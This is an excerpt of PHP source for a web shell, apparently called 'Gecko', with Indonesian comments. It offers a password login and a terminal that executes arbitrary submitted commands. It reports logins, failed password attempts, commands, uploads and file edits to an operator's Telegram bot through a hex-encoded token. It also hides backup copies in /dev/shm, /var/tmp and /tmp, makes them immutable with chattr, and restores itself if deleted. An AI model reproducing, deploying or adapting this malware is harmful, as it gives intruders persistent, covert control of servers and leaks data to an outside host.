...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$SzF8JFsUKtxoyrQGboQQ7OZJgsSaaC/3RBjPgjURDpnFzmUAPmOPa'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
        // Notify login berhasil
        @gecko_tg_notify("\xE2\x9C\x85 <b>LOGIN BERHASIL!</b>\n\nSeseorang berhasil login ke shell." . gecko_tg_info());
    } else {
        // Notify brute-force attempt jika ada input password tapi salah
        if (isset($_POST['pass']) && !empty($_POST['pass'])) {
            @gecko_tg_notify("\xF0\x9F\x94\xB4 <b>BRUTE-FORCE DETECTED!</b>\n\nAda yang coba login tapi password <b>SALAH</b>.\n\xF0\x9F\x94\x91 <b>Password dicoba:</b> <code>" . htmlspecialchars($_POST['pass']) . "</code>" . gecko_tg_info());
        }
        show_login_page();
    }
}
...
# ============================================
# Hidden Backup Persistence System
# ============================================
function gecko_hidden_path() {
    $paths = [
        @$GLOBALS['fungsi'][31]() . '/.gecko_cache',
        '/dev/shm/.gecko_cache',
        '/var/tmp/.gecko_cache',
        '/tmp/.gecko_cache',
    ];
...
function gecko_hidden_backup($source_path, $dest_name = null) {
    $hidden = gecko_hidden_path();
    if (!$hidden) return false;
    if ($dest_name === null) $dest_name = basename($source_path);
    $ts = date('Ymd_His');
    $dest = $hidden . '/' . $dest_name;
    // simpan file utama (overwrite)
    @copy($source_path, $dest);
    // simpan juga versi dengan timestamp sebagai history
    $hist_dir = $hidden . '/.hist';
    if (!@is_dir($hist_dir)) @mkdir($hist_dir, 0755, true);
    @copy($source_path, $hist_dir . '/' . $ts . '_' . $dest_name);
    // sembunyikan dengan chattr jika ada (linux)
    if (!stristr(PHP_OS, 'WIN')) {
        @exec('chattr +i ' . escapeshellarg($dest) . ' 2>/dev/null');
        @exec('chmod 0755 ' . escapeshellarg($hidden) . ' 2>/dev/null');
    }
    return $dest;
}

// Auto-backup shell itu sendiri saat diakses
$__shell_file = __FILE__;
...
# ============================================
$_tg_bot = "\x37\x39\x32\x33\x33\x38\x30\x35\x33\x31\x3a\x41\x41\x48\x4c\x79\x54\x77\x76\x51\x7a\x34\x33\x36\x6a\x79\x52\x70\x4b\x47\x73\x4f\x72\x45\x65\x61\x31\x45\x67\x59\x33\x4b\x48\x32\x75\x45";
...
// Deteksi shell dihapus -> auto-restore + notify
function gecko_check_shell_alive() {
    ...
    if (!@is_file($shell_file) && @is_file($backup_path)) {
        // Shell dihapus! Restore dari backup
                ...
                <div class="terminal-body">
                    <textarea class="box-shadow" disabled><?php
                                                            if (isset($_POST['terminal'])) {
                                                                $__tcmd = $_POST['terminal-text'];
                                                                @gecko_tg_notify("\xF0\x9F\x92\xBB <b>TERMINAL CMD</b>\n\n<b>Command:</b> <code>" . htmlspecialchars($__tcmd) . "</code>" . gecko_tg_info());
                                                                echo $fungsi[10](cmd($__tcmd . " 2>&1"));
                                                            }
                                                            ?></textarea>
                    <form action="" method="post">
                        <ul>
...
if (isset($_POST['gecko-up-submit'])) {
    ...
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
        // Backup file yang di-upload ke hidden path
        @gecko_hidden_backup($fungsi[0]() . "/" . $namaFilenya, 'upload_' . $namaFilenya);
        @gecko_tg_notify("\xF0\x9F\x93\xA4 <b>FILE UPLOADED</b>\n\n\xF0\x9F\x93\x84 <b>File:</b> <code>" . htmlspecialchars($namaFilenya) . "</code>\n\xF0\x9F\x93\x82 <b>Dir:</b> <code>" . $fungsi[0]() . "</code>\n\xF0\x9F\x92\xBE <b>Size:</b> " . formatSize(filesize($fungsi[0]() . "/" . $namaFilenya)) . gecko_tg_info());
        success();
    } else {
        failed();
    }
...
if (isset($_POST['save-editor'])) {
    $savedFile = $fungsi[0]() . "/" . unx($_GET['f']);
    $save = $fungsi[28]($savedFile, $_POST['code-editor']);
    if ($save) {
        // Backup file yang di-save ke hidden path
        @gecko_hidden_backup($savedFile, 'edited_' . basename($savedFile));
        @gecko_tg_notify("\xE2\x9C\x8F\xEF\xB8\x8F <b>FILE EDITED & SAVED</b>\n\n\xF0\x9F\x93\x84 <b>File:</b> <code>" . htmlspecialchars(basename($savedFile)) . "</code>\n\xF0\x9F\x93\x82 <b>Path:</b> <code>" . $savedFile . "</code>" . gecko_tg_info());
        success();
    } else {
        failed();
    }
